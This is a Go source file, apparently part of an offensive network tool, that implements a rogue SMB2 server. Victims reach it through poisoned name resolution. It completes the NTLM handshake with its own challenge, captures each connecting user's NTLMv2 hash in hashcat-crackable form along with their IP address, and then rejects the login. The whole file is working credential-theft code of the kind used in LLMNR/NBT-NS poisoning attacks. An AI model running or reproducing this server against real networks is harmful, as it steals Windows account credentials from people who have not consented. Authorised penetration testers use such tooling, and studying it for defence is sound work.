package commands

import (
	"context"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"sync"
	"time"
)

// captureSMBNTLM starts a minimal SMB2 server that captures NTLMv2 hashes
// from incoming authentication attempts. Poisoned name resolution directs
// victims to connect via SMB (port 445), which is the first protocol
// Windows tries for UNC paths and file share access.
func captureSMBNTLM(ctx context.Context, listenAddr string, mu *sync.Mutex, result *poisonResult) error {
	listener, err := net.Listen("tcp", listenAddr)
	if err != nil {
		return fmt.Errorf("bind SMB %s: %w", listenAddr, err)
	}
	defer listener.Close()

	go func() {
		<-ctx.Done()
		listener.Close()
	}()

	for {
		conn, err := listener.Accept()
		if err != nil {
			select {
			case <-ctx.Done():
				return nil
			default:
				continue
			}
		}
		go handleSMBCaptureConn(conn, mu, result)
	}
}

// handleSMBCaptureConn handles a single inbound SMB connection, performing
// the SMB2 NEGOTIATE + SESSION_SETUP exchange to capture NTLMv2 hashes.
func handleSMBCaptureConn(conn net.Conn, mu *sync.Mutex, result *poisonResult) {
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(30 * time.Second))

	var challenge [8]byte
	if _, err := rand.Read(challenge[:]); err != nil {
		return
	}

	var sessionID uint64
	var messageID uint64

	for round := 0; round < 4; round++ {
		pkt, err := smbServerReadPacket(conn)
		if err != nil {
			return
		}
		if len(pkt) < smb2HeaderSize {
			return
		}

		magic := string(pkt[0:4])
		if magic != smb2Magic {
			if round == 0 && len(pkt) >= 4 && pkt[0] == 0xFF && pkt[1] == 'S' && pkt[2] == 'M' && pkt[3] == 'B' {
				resp := smbServerBuildNegotiateResp(0, challenge, sessionID)
				smbServerWritePacket(conn, resp)
				continue
			}
			return
		}

		cmd := binary.LittleEndian.Uint16(pkt[12:14])
		reqMsgID := binary.LittleEndian.Uint64(pkt[24:32])
		_ = reqMsgID

		switch cmd {
		case smb2CmdNegotiate:
			messageID++
			resp := smbServerBuildNegotiateResp(messageID-1, challenge, sessionID)
			smbServerWritePacket(conn, resp)

		case smb2CmdSessionSetup:
			messageID++
			payload := pkt[smb2HeaderSize:]
			if len(payload) < 12 {
				return
			}
			secBufOff := binary.LittleEndian.Uint16(payload[12:14])
			secBufLen := binary.LittleEndian.Uint16(payload[14:16])
			if secBufLen == 0 {
				return
			}
			start := int(secBufOff)
			end := start + int(secBufLen)
			if end > len(pkt) {
				return
			}
			spnegoBlob := pkt[start:end]

			ntlmMsg := spnegoExtractNTLMToken(spnegoBlob)
			if ntlmMsg == nil {
				return
			}

			msgType := relayNTLMType(ntlmMsg)
			switch msgType {
			case ntlmTypeNegotiate:
				type2 := buildNTLMType2(challenge)
				respBlob := smbServerWrapType2SPNEGO(type2)
				sessionID = smbServerGenSessionID()
				resp := smbServerBuildSessionSetupResp(messageID-1, sessionID, smb2StatusMoreProcessing, respBlob)
				smbServerWritePacket(conn, resp)

			case ntlmTypeAuthenticate:
				hash := extractNTLMv2Hash(ntlmMsg, challenge)
				if hash != nil {
					remoteAddr, ok := conn.RemoteAddr().(*net.TCPAddr)
					if !ok {
						return
					}
					localAddr, ok := conn.LocalAddr().(*net.TCPAddr)
					if !ok {
						return
					}
					mu.Lock()
					result.QueriesAnswered++
					result.Credentials = append(result.Credentials, &sniffCredential{
						Protocol:  "ntlmv2",
						SrcIP:     remoteAddr.IP.String(),
						SrcPort:   uint16(remoteAddr.Port),
						DstIP:     localAddr.IP.String(),
						DstPort:   uint16(localAddr.Port),
						Username:  hash.Domain + "\\" + hash.Username,
						Password:  hash.HashcatFormat,
						Detail:    fmt.Sprintf("NTLMv2 SMB capture | hashcat -m 5600 | domain=%s", hash.Domain),
						Timestamp: time.Now().Unix(),
					})
					mu.Unlock()
				}
				resp := smbServerBuildSessionSetupResp(messageID-1, sessionID, smb2StatusLogonFailure, nil)
				smbServerWritePacket(conn, resp)
				return

			default:
				return
			}

		default:
			return
		}
	}
}

// smbServerReadPacket reads an SMB2 message with NetBIOS framing.
func smbServerReadPacket(conn net.Conn) ([]byte, error) {
	hdr := make([]byte, 4)
	if _, err := io.ReadFull(conn, hdr); err != nil {
		return nil, err
	}
	length := int(binary.BigEndian.Uint32(hdr)) & 0x00FFFFFF
	if length < 4 || length > 256*1024 {
		return nil, fmt.Errorf("invalid SMB packet length: %d", length)
	}
	pkt := make([]byte, length)
	if _, err := io.ReadFull(conn, pkt); err != nil {
		return nil, err
	}
	return pkt, nil
}

// smbServerWritePacket writes an SMB2 message with NetBIOS framing.
func smbServerWritePacket(conn net.Conn, data []byte) {
	hdr := make([]byte, 4)
	binary.BigEndian.PutUint32(hdr, uint32(len(data)))
	hdr[0] = 0
	_, _ = conn.Write(append(hdr, data...))
}

// smbServerBuildNegotiateResp builds an SMB2 NEGOTIATE response with a
// SPNEGO security blob advertising NTLM authentication.
func smbServerBuildNegotiateResp(messageID uint64, challenge [8]byte, sessionID uint64) []byte {
	spnegoHint := smbServerBuildNegHintSPNEGO()

	// SMB2 NEGOTIATE Response fixed part = 65 bytes
	// StructureSize(2) + SecurityMode(2) + DialectRevision(2) + NegContextCount(2) +
	// ServerGuid(16) + Capabilities(4) + MaxTransactSize(4) + MaxReadSize(4) +
	// MaxWriteSize(4) + SystemTime(8) + ServerStartTime(8) +
	// SecurityBufferOffset(2) + SecurityBufferLength(2) + NegContextOffset(4)
	negRespSize := 64 + len(spnegoHint)
	payloadSize := negRespSize

	resp := make([]byte, smb2HeaderSize+payloadSize)
	// SMB2 header
	copy(resp[0:4], smb2Magic)
	binary.LittleEndian.PutUint16(resp[4:6], smb2HeaderSize)
	binary.LittleEndian.PutUint16(resp[6:8], 1)
	binary.LittleEndian.PutUint32(resp[8:12], smb2StatusOK)
	binary.LittleEndian.PutUint16(resp[12:14], smb2CmdNegotiate)
	binary.LittleEndian.PutUint16(resp[14:16], 1)
	binary.LittleEndian.PutUint32(resp[16:20], smb2FlagResponse)
	binary.LittleEndian.PutUint64(resp[24:32], messageID)
	binary.LittleEndian.PutUint64(resp[40:48], sessionID)

	payload := resp[smb2HeaderSize:]
	binary.LittleEndian.PutUint16(payload[0:2], 65)
	binary.LittleEndian.PutUint16(payload[2:4], smb2SecurityModeSign)
	binary.LittleEndian.PutUint16(payload[4:6], smb2DialectSMB210)

	var guid [16]byte
	rand.Read(guid[:])
	copy(payload[8:24], guid[:])

	binary.LittleEndian.PutUint32(payload[24:28], 0)
	binary.LittleEndian.PutUint32(payload[28:32], 0x800000)
	binary.LittleEndian.PutUint32(payload[32:36], 0x800000)
	binary.LittleEndian.PutUint32(payload[36:40], 0x800000)

	secBufOffset := smb2HeaderSize + 64
	binary.LittleEndian.PutUint16(payload[56:58], uint16(secBufOffset))
	binary.LittleEndian.PutUint16(payload[58:60], uint16(len(spnegoHint)))

	copy(payload[64:], spnegoHint)

	return resp
}

// smbServerBuildSessionSetupResp builds an SMB2 SESSION_SETUP response.
func smbServerBuildSessionSetupResp(messageID, sessionID uint64, status uint32, securityBlob []byte) []byte {
	// SESSION_SETUP Response fixed part = 8 bytes
	// StructureSize(2) + SessionFlags(2) + SecurityBufferOffset(2) + SecurityBufferLength(2)
	payloadSize := 8 + len(securityBlob)

	resp := make([]byte, smb2HeaderSize+payloadSize)
	// SMB2 header
	copy(resp[0:4], smb2Magic)
	binary.LittleEndian.PutUint16(resp[4:6], smb2HeaderSize)
	binary.LittleEndian.PutUint16(resp[6:8], 1)
	binary.LittleEndian.PutUint32(resp[8:12], status)
	binary.LittleEndian.PutUint16(resp[12:14], smb2CmdSessionSetup)
	binary.LittleEndian.PutUint16(resp[14:16], 1)
	binary.LittleEndian.PutUint32(resp[16:20], smb2FlagResponse)
	binary.LittleEndian.PutUint64(resp[24:32], messageID)
	binary.LittleEndian.PutUint64(resp[40:48], sessionID)

	payload := resp[smb2HeaderSize:]
	binary.LittleEndian.PutUint16(payload[0:2], 9)
	binary.LittleEndian.PutUint16(payload[2:4], 0)

	secBufOffset := smb2HeaderSize + 8
	binary.LittleEndian.PutUint16(payload[4:6], uint16(secBufOffset))
	binary.LittleEndian.PutUint16(payload[6:8], uint16(len(securityBlob)))

	if len(securityBlob) > 0 {
		copy(payload[8:], securityBlob)
	}

	return resp
}

// smbServerBuildNegHintSPNEGO builds the SPNEGO negTokenInit hint blob for
// the SMB2 NEGOTIATE response, advertising NTLM as the supported mechanism.
func smbServerBuildNegHintSPNEGO() []byte {
	mechTypeSeq := asn1WrapSequence(ntlmsspOID)
	mechTypes := asn1WrapExplicit(0, mechTypeSeq)
	innerSeq := asn1WrapSequence(mechTypes)
	negTokenInit := asn1WrapExplicit(0, innerSeq)
	return asn1WrapApplication(0, append(spnegoOID, negTokenInit...))
}

// smbServerWrapType2SPNEGO wraps an NTLM Type 2 message in SPNEGO
// negTokenResp for an SMB2 SESSION_SETUP response.
func smbServerWrapType2SPNEGO(type2 []byte) []byte {
	negState := asn1WrapExplicit(0, []byte{0x0a, 0x01, 0x01})
	responseToken := asn1WrapExplicit(2, asn1WrapOctetString(type2))
	seq := asn1WrapSequence(append(negState, responseToken...))
	return asn1WrapContextTag(1, seq)
}

// smbServerGenSessionID generates a random session ID.
func smbServerGenSessionID() uint64 {
	var b [8]byte
	rand.Read(b[:])
	return binary.LittleEndian.Uint64(b[:])
}
